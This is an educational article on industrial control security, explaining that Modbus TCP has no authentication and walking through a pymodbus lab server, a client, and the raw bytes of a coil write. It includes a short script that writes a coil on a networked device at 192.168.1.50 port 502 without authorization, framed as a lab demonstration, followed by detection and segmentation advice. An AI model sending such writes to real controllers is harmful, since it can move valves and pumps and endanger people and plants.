# Modbus Has No Password

**Published:** 2026-09-17
**Module:** Module 2 — Protocol Literacy
**Code:** [github.com/mhebert-security/modbus-lab](https://github.com/mhebert-security/modbus-lab)

---

There is a protocol running on the wire in your nearest water treatment plant that has no login.

No account. No password. No session. No certificate. No handshake that establishes who you are before the plant has to decide whether to trust you. You send a number, and the number answers. If the number corresponds to a coil that opens a valve, the valve opens. The protocol does not ask who you are, because as far as it is concerned, everyone who can reach it is authorized to be there.

The protocol is Modbus. It was designed in 1979 by Modicon for serial communication between a master and a set of slaves on a trusted bus, and it is running right now, all over the world, on equipment you would not want to be reachable from anywhere you can get a foothold.

This article walks the protocol at the wire level. We will look at what Modbus actually sends when a controller tells a valve to open, build a Modbus server on a local machine, connect to it with a client that has no credentials because there are no credentials to have, and write a coil that nobody authorized. The companion project is a lab that does exactly that, and the code in this article is the code from the lab.

By the end I want the reader to feel, in the specific way that matters, what it is like to talk to a device that has been designed to trust you.

## A Very Short History

Modbus was designed by Modicon in 1979 as a protocol for communicating with programmable logic controllers over a serial line. The original physical layer was RS-232 and RS-485, and the original topology was one master talking to a set of slaves. The master polls each slave in turn. Each slave responds when asked. Slaves never speak unless spoken to, and there is no mechanism for a slave to verify that the master is legitimate.

The original frame format is called Modbus RTU. It is a compact binary encoding designed for a bus with limited bandwidth, and it includes a 16 bit CRC at the end of the frame for detecting transmission errors. Modbus ASCII is a text encoded variant of the same thing, less efficient, occasionally used where the medium cannot carry arbitrary bytes. Modbus TCP is the modern descendant: same protocol data unit, wrapped in an Ethernet friendly transport header and sent over TCP on port 502. That is the version you will encounter most often in a hospital or a refinery that has moved past serial, which is most of them.

Schneider Electric, which is what Modicon became, transferred stewardship of the spec to the Modbus Organization in 2004. The organization publishes the specification freely, and the spec is worth reading, not least because it is short and because the security model is stated plainly by its absence. There is a newer variant called Modbus Security that runs over TLS, published in 2018. Almost nobody uses it. I will come back to why.

What matters for this article is that all three variants, RTU, ASCII, and TCP, carry the same protocol data unit and the same complete absence of authentication. If you can send a well formed Modbus message to a device, the device will act on it.

## The Data Model

Modbus has four data tables. Understanding them is the whole of understanding the protocol.

**Discrete inputs** are single bit values, read only from the master's perspective. These typically represent switch states, limit switches, and other physical conditions that the device can sense but not change.

**Coils** are single bit values, read and write from the master's perspective. These typically represent outputs the device can control, such as whether a relay is energized or a valve is commanded open. A coil is the thing an attacker wants to write. Writing a coil is how you tell a physical device to change its state.

**Input registers** are 16 bit values, read only. These usually hold measurement data, sensor readings, or status information.

**Holding registers** are 16 bit values, read and write. These usually hold setpoints, configuration values, and any kind of numeric parameter the master might want to change. Writing a holding register is how you change what a device is aiming at.

The four tables are numbered from zero in the protocol. In vendor documentation, and in most of the literature you will read, they are numbered from one using what is called the Modicon convention: coils run from 00001 to 09999, discrete inputs from 10001 to 19999, input registers from 30001 to 39999, holding registers from 40001 to 49999. These ranges are a convention that grew up around the original Modicon addressing scheme, and different vendors interpret the boundary between the ranges differently. If you are ever debugging a Modbus device and reading a value that does not make sense, the first thing to check is whether the address in the documentation is one based or zero based.

Then there are function codes. A function code is a single byte in the protocol data unit that tells the server what operation to perform. The ones you will see constantly: 01 reads coils, 02 reads discrete inputs, 03 reads holding registers, 04 reads input registers, 05 writes a single coil, 06 writes a single holding register, 15 writes multiple coils, 16 writes multiple holding registers.

If you look at that list, you will notice that every function is either a read or a write. There is no function for "authenticate." There is no function for "establish session." There is no function for "log this action." There is no function for anything other than moving bits between a master and a slave.

That is not an oversight. It is the design. In 1979, the assumption was that if you were physically attached to the RS-485 bus, you had a reason to be. There was no threat model that included an attacker on the same wire, because the wire did not leave the building.

## What a Modbus Packet Looks Like

Modbus TCP is a protocol data unit with a seven byte header in front of it. The header is called the MBAP header, which stands for Modbus Application Protocol. It contains a two byte Transaction ID, a two byte Protocol ID that is always zero for Modbus, a two byte Length field, and a one byte Unit ID that in a TCP gateway scenario routes the request to a slave behind the gateway.

Then the PDU itself: a one byte function code, followed by the data for that function.

Here is the exact byte sequence that a client sends when it tells a server to energize coil number 5. The transaction ID is 1, the unit ID is 1, and the coil is being written with value FF00, which is the Modbus encoding for ON:

```
00 01    Transaction ID
00 00    Protocol ID
00 06    Length
01       Unit ID
05       Function code, Write Single Coil
00 05    Output address, coil 5
FF 00    Output value, ON
```

Twelve bytes. Read that sequence and notice what is missing. There is no field that carries a username. There is no field that carries a password. There is no field that carries a signature or any indication of who sent the packet. The bytes on the wire are the request, and the request is the entire message.

The response, if the write succeeds, is the same twelve bytes echoed back.

```
00 01 00 00 00 06 01 05 00 05 FF 00
```

The request and the response are identical. The protocol has no way to distinguish between a valid client and an attacker, because there is nothing to distinguish. A legitimate client and a legitimate attack are the same bytes on the wire. The difference exists only in the intent of the sender, and Modbus does not carry intent.

This is what the whole of the security problem comes down to. If an attacker can send twelve bytes to port 502 of a device, and if the twelve bytes are well formed, the device will act on them. There is no second step. There is no credential check that could be logged, no failed authentication that could raise an alert, no additional prompt that could slow the attacker down. The control action happens in the same request that would have been sent by the operator, at the same speed.

## Why It Is Still Everywhere

A reasonable person asks why, given all of this, Modbus is still the dominant protocol on industrial networks nearly half a century after it was designed.

The answer is not laziness. It is that Modbus is very good at the things it was designed to do, and the things it was designed to do are not the things security people care about.

It is simple enough to implement on a tiny microcontroller with a few kilobytes of memory. A PLC from 1995 and a PLC from 2024 and a sensor from 2010 all speak the same protocol because the protocol requires so little of them.

It is vendor neutral. A Siemens PLC, a Rockwell PLC, and a generic gateway all speak Modbus, which means a system integrator can wire them together without caring about vendor lock in. The absence of a proprietary handshake is a feature.

It is deterministic. A Modbus read takes a predictable amount of time, and a Modbus write takes a predictable amount of time, and a control loop that has to complete within a fixed window can rely on those timings. TLS does not have this property. A TLS handshake involves several round trips, an unpredictable amount of computation for the cryptography, and the possibility of a negotiation failure that the control loop has no mechanism for handling. A PLC with a control loop that has to complete in ten milliseconds does not want to wait for a certificate chain to be validated.

It is enormously deployed. The installed base is measured in the hundreds of millions of devices, and replacing them means replacing physical hardware in places where doing so is measured in capital projects rather than software updates.

Modbus Security, the TLS variant, addresses the confidentiality and integrity problems. It does not solve the deployment problem, because the devices that most need it are the ones least able to run it. The CPU on a thirty dollar sensor from 2008 does not have the cycles to perform an ECDHE key exchange. Which means the protocol that could be secured is not the protocol that is deployed, and the protocol that is deployed has no mechanism for security at all.

I want to be careful with the framing here, because there is a version of this argument that slides into "so there is nothing we can do." That is not where I am going. There are things to do, and they are the subject of the second half of this article. But the things to do are not protocol level, and they cannot be, and recognizing that is the first step toward doing them.

## A Lab

The companion project for this module is a Modbus lab at github.com/mhebert-security/modbus-lab. It has three pieces: a server that exposes a small set of coils and holding registers on a local port, a legitimate client that reads and writes those values the way an operator's HMI would, and a script that writes a coil without any of the ceremony a legitimate client would perform, because Modbus has no ceremony.

The server is written with pymodbus, the most commonly used Python implementation of the protocol. I am using pymodbus 3.x, which changed the client and server APIs significantly from 2.x. If you follow along with an older version, some of the calls will look different. The lab README notes the specific differences.

Here is the server. It exposes four tables of a hundred elements each, which is enough for a demonstration and small enough to inspect by hand:

```python
from pymodbus.server import StartTcpServer
from pymodbus.datastore import (
    ModbusSequentialDataBlock,
    ModbusDeviceContext,
    ModbusServerContext,
)

store = ModbusDeviceContext(
    co=ModbusSequentialDataBlock(1, [0] * 100),
    di=ModbusSequentialDataBlock(1, [0] * 100),
    hr=ModbusSequentialDataBlock(1, [0] * 100),
    ir=ModbusSequentialDataBlock(1, [0] * 100),
)

context = ModbusServerContext(devices=store, single=True)

StartTcpServer(context=context, address=("0.0.0.0", 5020))
```

Port 502 is the registered Modbus port and on most systems it requires elevated privileges to bind. The lab binds to 5020 instead. The server as written accepts connections from any address and answers every request it receives. That is not a configuration choice I am making. It is what an unmodified Modbus server does.

Now the legitimate client. It connects to the server, reads a coil, writes a coil, and reads a holding register:

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("127.0.0.1", port=5020)
client.connect()

response = client.read_coils(0, count=8, device_id=1)
print("coils before:", response.bits[:8])

client.write_coil(5, True, device_id=1)
print("wrote coil 5 to ON")

response = client.read_coils(0, count=8, device_id=1)
print("coils after: ", response.bits[:8])

client.write_register(10, 425, device_id=1)
print("wrote holding register 10 to 425")

response = client.read_holding_registers(10, count=1, device_id=1)
print("holding register 10:", response.registers)

client.close()
```

Output on my machine:

```
coils before: [False, False, False, False, False, False, False, False]
wrote coil 5 to ON
coils after:  [False, False, False, False, False, True, False, False]
wrote holding register 10 to 425
holding register 10: [425]
```

Nothing about that output is surprising. It is what the protocol does.

Now the attacker. Here is the script that writes the same coil. Find the part that makes it an attack:

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("192.168.1.50", port=502)
client.connect()

client.write_coil(5, True, device_id=1)

client.close()
```

That is the whole script. Four lines. There is no exploitation step. There is no vulnerability being leveraged. There is no password to guess, no token to forge, no session to hijack, no certificate to spoof.

The only difference between this script and the previous one is the IP address. The legitimate client talks to 127.0.0.1. The attack script talks to 192.168.1.50, a Modbus device on the same network as the attacker. That is the entire attack. Reachability.

## Reading the Capture

If you run the lab and capture the traffic, the packet that arrives at the target is exactly the one described above. Twelve bytes. No login:

```
0000   00 01 00 00 00 06 01 05 00 05 ff 00
```

In Wireshark it decodes as Transaction ID 1, Protocol ID 0, Length 6, Unit ID 1, Function Code 5 (Write Single Coil), Reference Number 5, Data FF00.

There is no field where the attacker's identity should be. It does not exist.

The capture of the attack is not distinguishable from the capture of a legitimate write. If a defender were looking at a packet capture of a real incident, the packet that caused a pump to overfill a tank and the packet that caused a legitimate setpoint adjustment would be the same twelve bytes. The difference is what they do, not what they say.

The full pcap from the lab is in the repository, alongside a Wireshark profile that decodes port 5020 as Modbus.

## The Mapping

In the ATT&CK for ICS framework, the technique is T0855 Unauthorized Command Message. It is the same technique that Industroyer used to open circuit breakers in Kyiv. It is the same technique that the B. Braun Infusomat Space vulnerability from Module 1 enables. The command is not a bug, and the technique is not a bug. The command is a command.

If the coil being written drives an output rather than an alarm, the technique also maps to T0831 Manipulation of Control. If the write targets a holding register that sets a setpoint, the mapping is T0836 Modify Parameter. If the write closes a coil that a safety function reads, the mapping is T0833 Modify Control Logic, and the consequences are the ones TRITON taught the field to worry about.

The CVE column is empty. There is no CVE for Modbus. Not because nobody has looked, but because there is nothing to assign a CVE to. The protocol does what it says it does, and the specification is public, and the security model was stated by the designers as an assumption that the physical layer would be trusted. That assumption was correct in 1979. The protocol has not changed since. The environment has.

If someone tells you that Modbus is insecure and shows you a CVE, ask them what the CVE is against. If it is against a specific vendor's Modbus implementation, that is a bug in the implementation and it is real. If it is against Modbus as a protocol, it is a category error, and the correct response is not a patch. It is a segmentation and monitoring problem.

## What to Do About It

There are three things, and I want to be specific about each.

Segmentation is the primary control, and there is no substitute for it. If a device speaks Modbus and the device drives a physical process, the device should be on a network segment where every other host is enumerated and trust is established by network position rather than by protocol. A protocol aware firewall that understands Modbus function codes can restrict which masters can issue write function codes, and to which register ranges. That is not authentication, but it is a boundary, and a boundary is what Modbus is missing.

Monitoring at the protocol level is the primary detective control. Modbus itself does not log the source of a write, because Modbus does not know the source of a write in any useful sense. A network sensor that captures Modbus traffic can record the source IP of each write, which is the only identity that exists at the protocol layer. From that you can build a baseline of which IPs normally write which function codes and which registers, and alert on deviations. An HMI issuing writes to a valve controller is expected. A workstation issuing the same writes is not, and that difference is visible at the network layer even though it is invisible at the protocol layer.

Protocol aware application layer inspection is worth the cost for anything safety related. Function code allow lists, register address allow lists per source, value range checks against physical plausibility. These are not authentication. They are not cryptography. They are the recognition that if the protocol cannot verify who is speaking, the network in front of it has to do that instead.

None of these three is a patch for Modbus. Modbus is not broken. It is unauthenticated by design, and the design is forty six years old, and the design assumed a world where the wire stayed inside the fence.

## What I Did Not Solve

Two things.

I do not have a clean answer for the small site. A rural water utility with a Modbus PLC controlling a chlorine feed pump and a Windows 7 laptop on the operator's desk does not have a budget for protocol aware firewalls, does not have a procurement process that would let it buy one, and does not have a security team to configure it. The advice in the previous section assumes capabilities that a large fraction of the installed base simply does not have. I do not know what to tell a small utility that cannot afford segmentation and cannot afford monitoring and cannot afford to replace the PLC.

I do not know how to reconcile protocol security with industrial controls timing. Modbus works because it takes a predictable amount of time. A protocol that adds authentication takes more time, and in some control loops, taking more time means missing the deadline, and missing the deadline means the loop fails. The tension between "authenticate every command" and "meet the control deadline" is real, and it is not resolved by anyone I have read. The paper answer is to authenticate at a point upstream of the loop and pass authenticated commands to the loop. The practical answer in most facilities is that the loop runs on Modbus and the security runs on the network boundary, and the two worlds meet in a way that neither wants to think about.

## What Comes Next

The next article looks at EtherNet/IP, which is the protocol most commonly found in North American manufacturing. It is more complex than Modbus. From a security standpoint, the absence of authentication is the same. After EtherNet/IP comes DNP3, which is what the electric grid runs on and which has a security extension that most of the installed base is not using, and then IEC 61850, which is the substation protocol that pays attention to safety in ways the others do not.

If you are reading this from a facility that runs Modbus, I have one ask. Find out who can reach your Modbus devices from the network layer. Not which accounts can log in. Modbus does not have accounts. Which IP addresses can send a packet to port 502 on your controllers. If the answer is a list you can write down in a single sitting, you have a boundary. If the answer is "anyone on the plant network," you have the same problem Stuxnet, Industroyer, and the Oldsmar attacker each solved in a different way.

## Companion Project

The Modbus lab at [github.com/mhebert-security/modbus-lab](https://github.com/mhebert-security/modbus-lab) contains three things: a pymodbus server you can run locally, a legitimate client that reads and writes the way an operator's HMI would, and the unauthorized write script from this article. The repository also includes the full packet capture from the lab session and a Wireshark profile that decodes port 5020 as Modbus so you can follow the byte sequences without configuring anything.

The purpose is not to provide a script for attacking Modbus devices. The purpose is to make the attack concrete enough that the absence of an authentication step is viscerally clear rather than abstractly understood. You cannot feel the gap by reading about it. You feel it when you run four lines of Python and a coil changes.
